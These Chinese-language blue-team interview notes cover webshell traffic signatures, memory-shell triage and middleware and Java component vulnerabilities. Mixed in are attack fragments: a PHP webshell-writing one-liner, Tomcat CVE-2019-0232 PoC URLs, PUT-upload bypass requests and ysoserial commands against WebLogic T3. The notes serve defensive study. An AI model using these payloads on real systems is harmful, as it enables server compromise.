加密后的明显参数多数是_0x......=这种形式所以_0x开头的参数名，以及dirname、get_current_user函数的字眼（需要讲请求内容解密后判断），后面为加密数据的数据包可以鉴定为蚁剑的流量特征
在命令执行时有目录标记[S]、[E]、[R]、[D]、等，说明已经拿到shell了（在执行系统命令）
payload特征
php assert、eval关键字执行,
asp eval在jsp使用
Java 同时会带有base64编码解码等字符特征

菜刀
老版本采用明文传输，非常好辨认
新版本采用base64加密，检测思路就是分析流量包，发现大量的base64加密密文就需要注意
请求头中
User-Agent存在百度或者火狐
请求体中会存在QGluaV9zZXQ攻击的开头部分后面的部分需要base64解码z0(也会修改)跟随后面的payload的base64的数据。z0是菜刀的默认参数，eval也会替换成assert的方式（可能是拼接）（"ass"."ert",....
固定的
QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtpZihQSFBfVkVSU0lPTjwnNS4zLjAnKXtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO307ZWNobygiWEBZIik7J

冰蝎
冰蝎1：冰蝎1有一个密钥协商过程，这个过程是明文传输，并且有两次流量，用来校验
冰蝎2：因为内置了很多的UA头，所以当某一个相同IP重复请求，但是UA头不一样的时候就需要注意了
冰蝎3：因为省去了协商过程，所以流量上可以绕过很多，但是其他特征依旧保留，比如ua头
冰蝎数据包总是伴随着大量的content-type：application什么什么，无论GET还是POST，请求的http中，content-type为application/octet-stream
还有他们的accept之类的长度总是等长，正常的根据应用场景和不同文件，长度是不同的
冰蝎4：
1.UserAgent字段：
Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)
Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/533+ (KHTML, like Gecko) Element Browser/5.0
Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.37 Edge/16.16299
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0
Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2526.106 Safari/537.36
Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)
Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko
Mozilla/5.0 (Windows NT 6.1; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0
Mozilla/5.0 (Windows NT 5.1; rv:40.0) Gecko/20100101 Firefox/40.0
Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36
Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko
Mozilla/7.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; Xbox)
2.流量特征，Content-type: Application/x-www-form-urlencoded。
3.Cinnection字段：
Connection: Keep-Alive(冰蝎默认使用的长连接是为了避免频繁的握手造成的资源丢失)
4..Accept字段：
请求头中存在Accept: application/json, text/javascript, */*; q=0.01
也有可能Accept: text/html,image/gif, image/jpeg, *; q=.2, */*; q=.2
Content-Type: application/octet-stream ******q=0.8

5.端口
冰蝎与webshell建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右，每连接一次，每建立一次新的连接，端口就依次增加。
检测思路
可以对符合该范围内的端口告警。
PHP webshell 中存在固定代码
流量特征
$post=Decrypt(file_get_contents(“php://input”));
eval($post);
检测思路
content字段中，将eval($post)作为流量特征纳入。

检测思路
可以作为辅助的流量特征。
6.固定的请求头和响应头
流量特征
请求字节头：
dFAXQV1LORcHRQtLRlwMAhwFTAg/M


哥斯拉
1.强特征：cookie字段，最后一个Cookie的值出现;（尾值出现分号）

2.请求中的Accept头是
Accept:text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8
3.paylod特征：jsp会出现xc,pass字符和Java反射，base64加解码等特征，php，asp则为普通的一句话木马。
4.还有响应，哥斯拉会响应三次，而且我认为还有一个地方需要注意的就是webshell连接，所以一般会设置长时间连接，所以connection这里会是keep-alive
5.响应头中的Cache-Control头是
Cache-Control: no-store, no-cache, must-revalidate
```



# 内存马

## Java内存马filter、servlet、listener、agent的排查，细说一下agent特别是冰蝎类型的排查思路

```
先查看检查服务器web日志，查看是否有可疑的web访问日志，比如说filter或者listener类型的内存马，会有大量url请求路径相同参数不同的，或者页面不存在但是返回200的请求。
如在web日志中并未发现异常，可以排查是否为中间件漏洞导致代码执行注入内存马，排查中间件的error.log日志查看是否有可疑的报错，根据注入时间和方法根据业务使用的组件排查是否可能存在java代码执行漏洞以及是否存在过webshell，排查框架漏洞，反序列化漏洞。
查看是否有类似哥斯拉、冰蝎特征的url请求，哥斯拉和冰蝎的内存马注入流量特征与普通webshell的流量特征基本吻合。
通过查找返回200的url路径对比web目录下是否真实存在文件，如不存在大概率为内存马。
```



## 内存马特征的识别

```
依然是以filter内存马举例
● filter特殊名称
内存马的Filter名一般比较特别，随便一点的可能有shell，Mem这种关键词或者随机数随机字母。当然这个特征并不是决定条件，因为讲究一点的攻击者也可以将filter伪装成web应用自带的名称。
● web.xml中没有filter配置
内存马的Filter是动态注册的，所以在web.xml中肯定没有配置，如果发现了在web.xml中不存在的filter，那么这个filter就十分可疑了
一般来说，正常的Filter都是由中间件的WebappClassLoader加载的。而攻击者利用的getshell攻击链往往具有明显的特征，比如反序列化漏洞喜欢利用TemplatesImpl和bcel执行任意代码。所以这些class往往就是以下这两个：
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl$TransletClassLoader
com.sun.org.apache.bcel.internal.util.ClassLoader
对应的classloader路径下没有class文件
所谓内存马就是代码驻留内存中，本地无对应的class文件。所以我们只要检测Filter对应的ClassLoader目录下是否存在class文件。(这也是很多内存马检测脚步实现的原理)
Filter的doFilter方法中有恶意代码
我们可以把内存中所有的Filter的class dump出来，使用反编译工具分析看看，是否存在恶意代码，比如调用了：java.lang.Runtime.getRunti
```



# 反序列化

## Java反序列化漏洞应急和修复

```
应急措施：
输入验证：对所有的输入数据进行严格的验证，拒绝任何不符合预期格式的数据。
限制网络访问：限制反序列化操作的网络访问权限，防止攻击者通过网络发送恶意的序列化数据。
日志监控：监控系统的日志，如果发现有异常的反序列化操作，立即进行处理。
修复措施：
升级库：如果反序列化漏洞存在于使用的库中，例如Java的java.io.ObjectInputStream，那么应该升级到最新的版本，或者使用没有这个漏洞的版本。
使用安全的反序列化方法：使用安全的反序列化方法，例如Java的java.io.ObjectInputStream的readObject方法可以被替换为readUnshared方法。
自定义序列化和反序列化：自定义序列化和反序列化的过程，只允许特定的类进行反序列化，拒绝所有其他的类。
使用签名：对序列化的数据进行签名，然后在反序列化时验证签名。如果签名不匹配，那么拒绝反序列化。
```



# 设备

## 设备发现了文件上传 如何判断是否成功

```
HTTP状态码：如果文件上传是通过HTTP协议进行的，那么可以通过检查HTTP响应的状态码来判断。通常，状态码为200表示请求成功，状态码为201表示创建成功，这两种状态码通常表示文件上传成功。

服务器响应内容：除了状态码，还可以通过分析服务器的响应内容来判断。例如，服务器可能会返回一个包含"success"或"upload successful"等信息的消息来表示文件上传成功。

日志分析：如果有访问服务器的权限，可以查看服务器的日志来判断文件是否上传成功。例如，FTP服务器通常会在日志中记录文件上传的信息。

直接检查：如果有权限，可以直接在服务器上查看是否存在上传的文件来判断文件是否上传成功。
```

## 

## 设备被写入了webshell 如何判断是否成功 

```
直接访问：如果知道Webshell的具体URL，可以尝试直接访问。如果Webshell成功执行，会有空白界面。

日志分析：检查服务器的访问日志，看是否有来自Webshell的特定请求。

网络流量监控：监控服务器的网络流量，看是否有异常。如果Webshell正在被使用，可能会产生一些异常的网络流量。

文件系统监控：检查Webshell写入的位置，看文件是否还在。如果文件被删除，可能是Webshell没有执行成功，或者执行者在使用后立即删除了它。

使用安全扫描工具：有一些安全扫描工具可以检测Webshell。可以使用这些工具进行检查（河马&D盾）
```



## 设备发现了暴力破解 如何分析是否成功

```
暴力破解的判断通常依赖于以下几个因素：
登录尝试的频率：如果在短时间内有大量的登录尝试，这可能是在暴力破解。
登录尝试的来源：如果所有的登录尝试都来自同一IP地址或者IP地址范围，这可能是在暴力破解。
登录尝试的凭据：如果登录尝试使用的用户名和密码组合非常多，这可能是在暴力破解。
登录尝试的路径：如果攻击者访问的路由是登录页面，这可能是在暴力破解。
判断是否成功，可以通过以下方式：
登录尝试是否突然停止：如果暴力破解成功，攻击者可能已经获取了他们需要的凭据，因此登录尝试可能会突然停止。
是否有新的、未知的登录成功事件：如果有新的、未知的登录成功事件，这可能表明暴力破解已经成功。
误报的判断可以通过以下方式：
检查登录尝试的模式：如果登录尝试的模式与正常用户的行为模式相符（例如，只有在工作时间尝试登录），那么这可能是误报。
检查登录尝试的凭据：如果登录尝试使用的是已知的、有效的用户名和密码组合，那么这可能是误报。
```



# 中间件漏洞

## apache

```
解析漏洞
原理：
Apache服务器在处理文件请求时，会根据请求的文件后缀名来确定文件的MIME类型，进而选择相应的处理方式。如果请求的文件后缀名与配置的MIME类型不匹配，Apache服务器可能会将其当作可执行的PHP文件来处理。攻击者可以利用这一特性，构造特定格式的文件名，如“.php.jpg”，使Apache将其实质内容作为PHP代码来执行，从而达到利用漏洞的目的。
修复方法：
1. 正确配置MIME类型：确保Apache服务器中配置的MIME类型与实际文件后缀名相匹配，避免出现不匹配的情况。同时，限制可执行文件的扩展名，例如禁止“.php”后缀的文件被直接执行。
2. 文件上传功能的安全性：如果网站需要用户上传文件，应使用白名单机制对上传的文件进行严格审核，确保只允许上传可信的文件类型。同时，对上传的文件进行杀毒处理，防止恶意文件上传并执行。
3. 定期更新补丁：保持Apache服务器的更新，及时安装官方发布的补丁和安全更新，以修复已知的安全漏洞。
4. 安全审计与监控：对网站进行安全审计和监控，定期检查服务器日志，及时发现异常行为和潜在的攻击活动。
5. 限制服务器功能：根据最小权限原则，只启用必要的服务器功能和应用程序组件，减少潜在的安全风险。
6. 使用Web应用防火墙（WAF）：部署WAF可以有效地拦截针对Web应用的攻击，包括针对Apache解析漏洞的攻击尝试。WAF能够识别并过滤恶意请求，防止攻击者利用该漏洞实施恶意操作。
目录遍历
原理：
目录遍历漏洞是由于服务器没有正确地限制用户对文件系统的访问，导致攻击者可以通过构造特殊的URL（例如包含“../”的URL）来访问到服务器文件系统中的其他目录。
利用条件：
Apache服务器配置不当，没有正确地限制用户对文件系统的访问。
修复方法：
在httpd.conf文件中找到Options + Indexes + FollowSymLinks + ExecCGI并修改成Options -Indexes + FollowSymLinks + ExecCGI并保存（吧+修改为-）
```



## nginx

```
文件解析
原理
Nginx 解析漏洞该解析漏洞是PHP CGI 的漏洞，在PHP的配置文件中有一个关键的选项cgi.fix_pathinfo默认开启，当URL中有不存在的文件，PHP就会向前递归解析 在一个文件路径（/xx.jpg）后面加上/xx.php会将/xx.jpg解析为 php 文件。
Nginx<=0.8.37 解析漏洞 在Fast-CGI关闭的情况下，Nginx <=0.8.37 依然存在解析漏洞，在一个文件路径（/xx.jpg）后面加上%00.php 会将 /xx.jpg%00.php 解析为php 文件。另一种手法：上传一个名字为test.jpg，包含以下内容文件：<？PHP fputs(fopen(‘shell.php’.‘w’),’<?phpeval($_POST[cmd])?>’);?> 然后访问test.jpg/.php 在这个目录下就会生成一句话木马shell.phphttps://blog.csdn.net/Tauil/article/details/125888127
修复方法
升级Nginx到最新版本。
在Nginx的配置文件中，对于路径的处理进行严格的限制，例如，可以通过正则表达式来限制路径中只能包含特定的字符。
对于用户上传的文件，进行严格的检查和过滤，例如，可以检查文件的扩展名，只允许上传特定类型的文件；也可以检查文件的内容，对于包含可疑代码的文件进行拦截。
目录遍历
原理
Nginx目录遍历漏洞主要是由于Nginx在处理用户请求时，对于路径的解析存在问题，攻击者可以通过构造特殊的请求路径，来访问到不应该被访问的文件或目录。例如，攻击者可以发送一个请求路径如/../../etc/passwd，Nginx在处理这个请求时，可能会将其解析为服务器文件系统的/etc/passwd文件，从而导致攻击者可以读取到这个文件的内容。
漏洞利用： 
攻击者可以利用这个漏洞来读取服务器上的任意文件，例如配置文件、数据库文件等，从而获取到敏感信息；也可以利用这个漏洞来遍历服务器上的目录结构，以便于发现更多的攻击点。
修复
升级Nginx到最新版本。
在Nginx的配置文件中，对于路径的处理进行严格的限制，例如，可以通过正则表达式来限制路径中只能包含特定的字符。
对于用户的请求，进行严格的检查和过滤，例如，可以检查请求的路径，对于包含../这样的路径进行拦截。
使用WAF（Web Application Firewall）来防护，WAF可以对用户的请求进行深度检查和过滤，对于包含攻击行为的请求，可以进行拦截。
CRLF注入
漏洞描述
CRLF是”回车+换行”(\r\n)的简称,其十六进制编码分别为0x0d和0x0a。在HTTP协议中,HTTP header与HTTP Body是用两个CRLF分隔的,浏览器就是根据这两个CRLF来取出HTTP内容并显示出来。所以,一旦我们能够控制HTTP消息头中的字符,注入一些恶意的换行,这样我们就能注入一些会话Cookie或者HTML代码。CRLF漏洞常出现在Location与Set-cookie消息头中
CRLF注入漏洞又称HTTP响应拆分漏洞（HTTP Response Splitting），攻击方式是将回车符、换行符注入到HTTP的响应包中。
  HTTP响应包通常以两个换行符，去划分响应头与响应正文两个部分。当用户的操作足以控制响应头的内容时，将会出现CRLF漏洞。
回车符(CR，ASCII 13，\r，%0d)
换行符(LF，ASCII 10，\n，%0a)
漏洞原理
修改nginx.conf,在如下图位置添加如下配置,此配置实现了强制跳转的功能,当用户访问nginx服务器时由于此配置的存在会被强制跳转到以https协议访问之前访问的链接。
上面的配置的关键利用点由两个:一是配置中的$url是我们可以控制的,这样我们就可以在$url处填入CRLF,然后对服务器进行访问实现头部注入。二是服务器会返回一个302跳转给用户,所以我们注入的头部参数又会返回到客户这边。
漏洞修复
升级Nginx到最新版本，新版本的Nginx已经修复了这个问题。
在处理用户输入的数据时，进行严格的过滤和检查，对于包含\r\n的数据，进行拦截或者替换
https://www.cnblogs.com/yuzly/p/11212233.html
目录穿越
配置不当引起的目录穿越，路径为：/files
```



## tomcat

```
Tomcat 远程代码执行（CVE-2019-0232）
影响版本
Apache Tomcat 9.0.0.M1 to 9.0.17
 
Apache Tomcat 8.5.0 to 8.5.39
 
Apache Tomcat 7.0.0 to 7.0.93
漏洞原理
由于使用enableCmdLineArguments在Windows上运行时，远程执行代码漏洞（CVE-2019-0232）驻留在公共网关接口（CGI）Servlet中，java运行时环境（JRE）将命令行参数传递给Windows的方式存在缺陷导致
漏洞利用
触发该漏洞需要同时满足以下条件：
1.  系统为Windows 
2.  启用了CGI Servlet（默认为关闭） 
3.  启用了enableCmdLineArguments（Tomcat 9.0.*及官方未来发布版本默认为关闭） 
Poc：
http://localhost:8080/cgi-bin/hello.bat?& C%3A%5CWindows%5CSystem32%5Cnet.exe+user

http://localhost:8080/cgi-bin/hello.bat?&C%3A%5CWindows%5CSystem32%5Ccalc.exe
漏洞修复
1.禁用enableCmdLineArguments参数。
2.在conf/web.xml中覆写采用更严格的参数合法性检验规则。
3.升级tomcat到9.0.17以上版本。
Tomcat session反序列化（CVE-2020-9484）

war后门文件部署
任意文件写入（CVE-2017-12615）
漏洞原理
Tomcat配置文件/conf/web.xml 配置了可写（readonly=false），导致可以使用PUT方法上传任意文件，攻击者将精心构造的payload向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行
漏洞利用
加'/'是为了绕过jsp文件的限制，斜杠在文件名中是非法的，所以会被去除（Linux和Windows都适用）
方法二：使用空格%20 (在Windows中适用)
在Windows下不允许文件以空格结尾，因此上传到windows会被自动去掉末尾空格
PUT /shell.jsp%20 HTTP/1.1
方法三：使用NTFS流(在Windows中适用的)
PUT /x.jsp::$DATA HTTP/1.1

漏洞修复
配置readonly和VirtualDirContext值为True或注释参数，禁止使用PUT方法并重启tomcat
注意：如果禁用PUT方法，对于依赖PUT方法的应用，可能导致业务失效。
2、根据官方补丁升级最新版本
```



## weblogic

```
反序列化漏洞
SSRF
任意文件上传
war后门文件部署
```



## iis

```
PUT漏洞
短文件名猜解
远程代码执行
解析漏洞
```



## jboss

```
反序列化漏洞
war后门文件部署
```

## 其它中间件相关漏洞

```
FastCGI未授权访问、任意命令执行
PHPCGI远程代码执行
```



# java组件

## shiro

```
shiro漏洞原理
Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理。服务端在接收cookie时： 检索RememberMe Cookie的值 Base 64解码 AES解密（加密密钥硬编码） 进行反序列化操作（未过滤处理） 攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。
shiro550与shiro721的区别
1、这两个漏洞主要区别在于Shiro550使用已知密钥碰撞，只要有足够密钥库（条件较低），不需要Remember Cookie
2、Shiro721的ase加密的key基本猜不到，系统随机生成，可使用登录后rememberMe去爆破正确的key值，即利用有效的RememberMe Cookie作为Padding Oracle Attack的前缀，然后精心构造 RememberMe Cookie 值来实现反序列化漏洞攻击，难度高。
流量特征：
1. 请求包Cookie的rememberMe中会存在AES+base64加密的一串java反序列化代码。
2. 返回包中存在base64加密数据，该数据可作为攻击成功的判定条件。
3. HTTP请求中含有”/shiro/”字符；
4. HTTP请求中含有”rememberMe”参数；
5. HTTP请求中含有”JSESSIONID”参数；
6. HTTP响应中含有”org.apache.shiro.subject.SimplePrincipal[collection]字符；
7. HTTP响应中含有”rememberMe=deleteMe”字符。
```



## fastjson

```
fastjson 漏洞利用原理
在请求包里面中发送恶意的 json 格式 payload，漏洞在处理 json 对象的时候， 
没有对@type 字段进行过滤，从而导致攻击者可以传入恶意的 TemplatesImpl 类，而 
这个类有一个字段就是_bytecodes，有部分函数会根据这个_bytecodes 生成 java 实 
例，这就达到 fastjson 通过字段传入一个类，再通过这个类被生成时执行构造函数。 

FastJson不出网利用
两条利用链
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl
org.apache.tomcat.dbcp.dbcp2.BasicDataSource
将命令执行结果写在静态文件，dnslog外带，Commons-io 写文件/webshell,BECL攻击导致命令执行和内存马
怎么查看fastjson版本
可以直接在异常信息中暴露出 fastjson 的精确版本，然后再根据版本去测试已知漏洞。
或者直接提交json数据，看服务器回显
```



## weblogic

```
谈一下weblogic的t3协议
T3协议缺陷实现了Java虚拟机的远程方法调用（RMI），能够在本地虚拟机上调用远端代码。
T3协议用于在Weblogic服务器和其他类型的Java程序之间传输信息的协议。Weblogic会跟踪连接到应用程序的每个Java虚拟机，要将流量传输到Java虚拟机，Weblogic会创建一个T3连接。该链接会通过消除在网络之间的多个协议来最大化效率，从而使用较少的操作系统资源。用于T3连接的协议还可以最大限度减少数据包大小，提高传输速度。
攻击操作
使用ysoserial启动一个JMRP Server
java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener 8888 CommonsCollections1 "touch /tmp/akemi.txt"
说明：'touch /tmp/akemi.txt’为执行的命令，8888是JRMP Server监听的端口。
然后利用该漏洞现存的exp进行攻击
python 44553.py 192.168.188.185 7001 ysoserial-0.0.6-SNAPSHOT-BETA-all.jar 192.168.188.185 8888 JRMPClient
说明：由于该漏洞是在一台虚拟机上进行操作的，所以IP地址都是同一个。
192.168.188.185 7001 是weblogic启动环境的IP和端口。
192.168.188.185 8888 的JRMP 一端的IP地址和端口。
JRMPClien是执行JRMPClient的类。

进入docker容器查看文件是否创建成功


weblogic和strtus2攻击流量特征
strtus2

```



